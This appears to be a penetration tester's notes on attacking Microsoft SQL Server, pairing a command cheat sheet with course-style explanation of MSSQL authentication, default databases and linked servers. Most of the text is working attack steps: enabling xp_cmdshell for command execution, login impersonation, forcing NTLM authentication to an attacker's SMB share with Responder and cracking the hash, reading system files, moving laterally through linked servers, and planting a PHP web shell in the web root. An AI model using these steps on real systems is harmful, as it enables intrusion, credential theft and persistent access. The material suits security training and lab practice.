##### Scanning
```bash
nmap -Pn -sV -sC -p1433 10.10.10.125

nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip

msfconsole
use auxiliary/scanner/mssql/mssql_ping

mssqlclient.py -p 1433 Administrator:password@$ip -windows-auth
mssqlclient.py -p 1433 .\\Administrator:password@$ip 
mssqlclient.py -p 1433 domain.local/adot8:password@$ip 

netexec mssql 10.10.10.101 -d domain -u adot8 -p password -x "whoami"

sqsh -S 10.129.20.13 -U username -P Password123
```
##### Enumeration
```sql
select @@version;
SELECT r.name AS role, m.name AS member FROM sys.server_principals r JOIN sys.server_role_members rm ON r.principal_id = rm.role_principal_id JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id WHERE r.name = 'sysadmin';
SELECT name FROM sys.databases;
SELECT name FROM master..sysdatabases;
USE adot8;
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
SELECT name FROM <databaseName>..sysobjects WHERE xtype = 'U';    <-- find users table
select * from <databaseName>.dbo.users;
select * from <databaseName>.dbo.users where name like 'Admin%';
select * from <databaseName>..users;
```
##### **VIEW LINKED SERVERS - LATERAL MOVEMENT**

```powershell
SELECT srvname, isremote FROM sysservers

EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]

1> EXECUTE('master..xp_dirtree ''\\10.10.14.177\share\''') AT [LOCAL.TEST.LINKED.SRV]
2> GO
```
##### Configure xp_cmdshell
```sql
sp_configure 'show advanced options', '1';
RECONFIGURE;
sp_configure 'xp_cmdshell', '1';
RECONFIGURE;
xp_cmdshell 'whoami';

exexute sp_configure 'show advanced options', '1';
RECONFIGURE;
exexute sp_configure 'xp_cmdshell', '1';
RECONFIGURE;
exexute xp_cmdshell 'whoami;
```
##### Impersonate User
```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

enum_impersonate
exec_as_user <grantor>
exec_as_login <grantor>
```
##### Capture Hash
**THIS CAN ALSO BE USED WITH AN SMB RELAY ATTACK TO GAIN A LOCAL ADMIN** 
```bash
sudo responder -I tun0
xp_dirtree \\10.10.14.3\adot8\
xp_subdirs \\10.10.14.3\adot8\
```

```bash
hashcat -m 2000 mssql.hash ~/rockyou.txt -O
```
##### Read and copy file
```sql
select x from OpenRowset(BULK 'C:\Users\Administrator\root.txt',SINGLE_CLOB) R(x)

select x from OpenRowset(BULK 'C:\windows\win.ini',SINGLE_CLOB) R(x)

create table #errortable (ignore int)
bulk insert #errortable from '\\localhost\c$\windows\win.ini' with ( fieldterminator=',', rowterminator='\n', errorfile='c:\programdata\thatjusthappend.txt' )
```
##### Write local files
```bash
sp_configure 'show advanced options', 1
RECONFIGURE
sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```
[Microsoft SQL](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`) is Microsoft's SQL-based relational database management system. Unlike MySQL, which we discussed in the last section, MSSQL is closed source and was initially written to run on Windows operating systems. It is popular among database administrators and developers when building applications that run on Microsoft's .NET framework due to its strong native support for .NET.
### MSSQL Clients
[SQL Server Management Studio](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15) (`SSMS`) comes as a feature that can be installed with the MSSQL install package or can be downloaded & installed separately. It is commonly installed on the server for initial configuration and long-term management of databases by admins. Keep in mind that since SSMS is a client-side application, it can be installed and used on any system an admin or developer is planning to manage the database from.

**This means we could come across a vulnerable system with SSMS with saved credentials that allow us to connect to the database. The image below shows SSMS in action.**
![[Pasted image 20250103150154.png]]
### MSSQL Databases
|Default System Database|Description|
|---|---|
|`master`|Tracks all system information for an SQL server instance|
|`model`|Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database|
|`msdb`|The SQL Server Agent uses this database to schedule jobs & alerts|
|`tempdb`|Stores temporary objects|
|`resource`|Read-only database containing system objects included with SQL server|
### Default Configuration
When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as `NT SERVICE\MSSQLSERVER`. Connecting from the client-side is possible through Windows Authentication, and by default, encryption is not enforced when attempting to connect.
![[Pasted image 20250103150210.png]]Authentication being set to `Windows Authentication` means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting Active Directory) before allowing connectivity to the database management system. Using Active Directory can be ideal for auditing activity and controlling access in a Windows environment, but if an account is compromised, it could lead to privilege escalation and lateral movement across a Windows domain environment.
### Dangerous Settings
- MSSQL clients not using encryption to connect to the MSSQL server
- The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
- The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)
- Weak & default `sa` credentials. Admins may forget to disable this account

`MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), which means that users can be created in Windows or the SQL Server:

|**Authentication Type**|**Description**|
|---|---|
|`Windows authentication mode`|This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.|
|`Mixed mode`|Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.|
## Communicate with Other Databases with MSSQL

`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. Let's see how we can identify and execute queries on linked servers.
```powershell
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

As we can see in the query's output, we have the name of the server and the column `isremote`, where `1` means is a remote server, and `0` is a linked server.

Next, we can attempt to identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).

> [!NOTE] Note
> If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).
```powershell
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

```powershell
1> EXECUTE('master..xp_dirtree ''\\10.10.110.17\share\''') AT [10.0.0.12\SQLEXPRESS]
2> GO
```